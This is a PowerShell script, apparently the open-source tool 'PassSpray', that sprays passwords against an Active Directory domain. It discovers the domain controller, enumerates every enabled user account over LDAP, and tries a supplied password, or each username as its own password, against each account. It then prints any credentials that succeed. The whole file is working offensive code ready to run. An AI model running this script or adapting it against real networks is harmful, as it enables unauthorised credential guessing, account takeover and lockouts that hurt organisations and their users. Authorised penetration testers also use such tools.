<#

.SYNOPSIS
PassSpray.ps1 Author: Rob LP (@L3o4j)
https://github.com/Leo4j/PassSpray

.DESCRIPTION
Domain Password Spray

#>

function Invoke-PassSpray {
	Param
    (
		[string]
        $Password,
		[string]
        $Domain,
		[string]
        $DomainController,
		[switch]
		$UserAsPassword
    )
	
	if(!$Domain){
		$Domain = $env:USERDNSDOMAIN
		if(!$Domain){$Domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
	 	if(!$Domain){$Domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	}
	
	if(!$DomainController){
		$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
		$domainControllers = $currentDomain.DomainControllers
	 	$DomainController = $domainControllers[0].Name
	  	if(!$DomainController){
			$DomainController = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().RidRoleOwner.Name
		}
	  	if(!$DomainController){
			$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$Domain" 2>$null
			$DomainController = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
	  	}
	}

	$AllUsers = @()
	$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
	if($Domain){
		if($DomainController){
			$TempDomainName = "DC=" + $Domain.Split(".")
			$domainDN = $TempDomainName -replace " ", ",DC="
			$ldapPath = "LDAP://$DomainController/$domainDN"
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
		}
		else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")}
	}
	else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry}
	$objSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
	$objSearcher.PageSize = 1000
 	$objSearcher.PropertiesToLoad.Clear() | Out-Null
 	$objSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
	$AllUsers = $objSearcher.FindAll() | ForEach-Object { $_.properties.samaccountname }
	$AllUsers = $AllUsers | Sort-Object -Unique
	
	$KeepTrack = $False
 	$LDAPPath = "LDAP://"
    	$LDAPPath += $Domain
     	
	foreach($usr in $AllUsers){
		try {
		        $PasswordList = @()  # Always initialise it cleanly

				if ($UserAsPassword) {
					$PasswordList = @($usr, $usr.ToLower())
					$PasswordList = $PasswordList | Sort-Object -Unique
				} else { $PasswordList = @($Password)}
				
				foreach($passwd in $PasswordList){
					$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry("$LDAPPath", "$Domain\$usr", "$passwd")
					if ($directoryEntry.name -ne $null) {
						if($passwd){
							Write-Output "[+] Authentication Successful for user $usr using password $passwd"
						} else { Write-Output "[+] Authentication Successful for user $usr using an empty password" }
						$KeepTrack = $True
					}
				}
		} catch {}
	}
 	if($KeepTrack -eq $False){Write-Output "[-] No Success"}
}
